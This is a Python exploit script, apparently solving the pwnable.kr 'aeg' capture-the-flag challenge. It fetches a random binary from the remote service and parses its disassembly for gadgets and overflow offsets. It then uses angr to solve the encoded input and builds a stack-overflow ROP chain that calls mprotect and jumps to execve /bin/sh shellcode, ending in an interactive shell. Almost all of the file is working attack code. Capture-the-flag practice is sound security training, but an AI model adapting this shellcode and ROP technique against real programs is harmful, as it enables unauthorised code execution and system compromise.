from pwn import *
import base64
import subprocess
import re
import angr
import claripy
context.log_level="info"

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

def parse_bin(fname):
    ''' This function parses the random binary and extracts symbols necessary for exploitation'''
    global start, avoid, target, overflow_padding, buf_addr, loadreg_gadget_addr, loadreg_gadget_rbp_offset, xor_pad, mprotect

    objdump = subprocess.check_output("objdump -d {} -M intel".format(fname), shell=True)
    objdump_lines = objdump.split("\n")

    # Get xor pad applied to input
    xor_bytes = [line for line in objdump_lines if "83 f0" in line]
    xor_byte1 = xor_bytes[0].split("f0 ")[1][:2]
    xor_byte2 = xor_bytes[1].split("f0 ")[1][:2]
    print xor_byte1, xor_byte2
    xor_pad = (xor_byte1 + xor_byte2).decode('hex')

    # Get PLT symbols
    elf = ELF(fname)
    memcpy = elf.plt['memcpy']
    target = memcpy
    mprotect = elf.plt['mprotect']

    hex_rex = '([\dabcdef]*)'
    put_rex = '<puts@plt>\n'
    rex = put_rex + '.{0,1024}?' + put_rex
    seg = re.search(rex, objdump, flags = re.DOTALL).group(0)

    # Find start for angr search, right after puts("payload encoded. let's go!");
    start = int(re.search(hex_rex + ':', seg).group(1), 16)
    # Avoid for angr, puts('end of program')
    avoid = int(re.search(hex_rex + ':', seg.split('\n')[-3]).group(1), 16)

    # In the does_memcpy function that has overflow, get the amount subbed from rsp as overflow padding
    overflow_padding = re.search("sub\s*rsp,0x" + hex_rex + ".{0,600}?<memcpy@plt>", objdump, flags=re.DOTALL).group(1)
    overflow_padding = int(overflow_padding, 16)

    # Get address of bss buffer holding decoded user input
    # from esi, src arg to memcpy
    buf_addr = re.search("mov\s*esi,0x" + hex_rex + ".{0,200}?<memcpy@plt>", objdump, flags=re.DOTALL).group(1)
    buf_addr = int(buf_addr, 16) - 48

    # Get address of gadget that loads all registers as local variables from rbp
    loadreg_gadget = re.findall(hex_rex + ":.{0,30}?" + "mov\s*QWORD PTR \[rbp-0x" + hex_rex + ".{0,10}?r9", objdump)
    loadreg_gadget_addr = int(loadreg_gadget[1][0], 16) + 4
    loadreg_gadget_rbp_offset = int(loadreg_gadget[1][1], 16) - 40

    print "start", hex(start)
    print "avoid", hex(avoid)
    print "target", hex(target)
    print "overflow padding", hex(overflow_padding)
    print "buf_addr", hex(buf_addr)
    print "loadreg_gadget_addr", hex(loadreg_gadget_addr)
    print "loadreg_gadget_rbp_offset", hex(loadreg_gadget_rbp_offset)

def solve_angr(fname):
    project = angr.Project(fname)
    initial_state = project.factory.blank_state(addr=start)
    simulation = project.factory.simgr(initial_state)

    # symbolic buffer
    buf = claripy.BVS("buf", 48*8)
    # load buffer into memory at address
    initial_state.memory.store(buf_addr, buf)

    # Step until we have reached the overflowing memcpy
    def step_func(sim):
	sim.drop(filter_func = lambda path: path.addr == avoid)
	sim.move(from_stash='active', to_stash='found', filter_func = lambda path: path.addr == target)
	return sim
    
    simulation.step(step_func = step_func, until=lambda simgr: len(simgr.found) > 0)

    soln_state = simulation.found[0]
    # Evaluate symbolic buffer and cast as string
    soln = soln_state.se.eval(buf, cast_to=str)
    
    # Xor found buffer with xor_pad to get user input
    solved_input = xor(soln, xor_pad).encode('hex')
    print "solved input", solved_input
    return solved_input


def construct_payload(fname):
    parse_bin(fname)
    solved_input = solve_angr(fname)

    print "[-] Exploit phase"
    # First chain
    # Set RBP to be within buffer, so that this gadget fills registers
    '''
 13679c4:   4c 8b 45 b0             mov    r8,QWORD PTR [rbp-0x50]
 13679c8:   48 8b 7d a0             mov    rdi,QWORD PTR [rbp-0x60]
 13679cc:   48 8b 4d a8             mov    rcx,QWORD PTR [rbp-0x58]
 13679d0:   48 8b 55 c0             mov    rdx,QWORD PTR [rbp-0x40]
 13679d4:   48 8b 75 b8             mov    rsi,QWORD PTR [rbp-0x48]
 13679d8:   48 8b 45 c8             mov    rax,QWORD PTR [rbp-0x38]
    '''
    # Then, add second exploit chain. leave in epilogue of gadget
    # does mov rsp, rbp  and points rsp to the rest of chain in buf

    payload = 'Q'*overflow_padding # padding from does_memcpy function

    new_rbp_padding = 48 + overflow_padding + 7*8 + loadreg_gadget_rbp_offset # len(input) + overflow pad + space for regs + random gadget rbp offset
    payload += p64(buf_addr + new_rbp_padding) # Overwrite RBP with buffer address that correctly aligns local variables with register vals
    payload += p64(loadreg_gadget_addr) # points to gadget above
    payload += 'F'*8 # rdi, dummy val because overwritten by rax
    payload += 'C'*8 # rcx 
    payload += 'B'*8 # r8 
    payload += p64(0x10000)  # rsi, len
    payload += p64(7) # rdx, prot rwx
    payload += p64(buf_addr & 0xFFFFFFFFFFFFF000) # rax, moved to rdi. mprotect addr arg, page-aligned
    
    # Second chain, call mprotect(buf_addr, 0x10000, 7)
    payload += 'Y'*loadreg_gadget_rbp_offset # leave will mov rsp, rbp, so now rsp points here in buf
    payload += p64(mprotect)
    
    # Now, get ourselves pointed to shellcode
    payload += p64(buf_addr + new_rbp_padding + 24) # ptr to shellcode in buf
    payload += shellcode

    payload = xor(payload, xor_pad).encode('hex')
    print "payload", solved_input + payload
    return solved_input + payload

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("pwnable.kr", 9005)
    binary = p.recvuntil("hurry up!")

    binary = binary.split("\n")[8]

    fname = "aeg4"
    with open (fname, 'wb') as f:
        f.write(base64.b64decode(binary))

    subprocess.call("zcat {} > {}bin".format(fname, fname), shell=True)
    subprocess.call("chmod +x {}bin".format(fname), shell=True)

    payload = construct_payload(fname + "bin")
    p.sendline(payload)
    p.interactive()
else:
    fname = "aeg2bin"
    payload = construct_payload(fname)

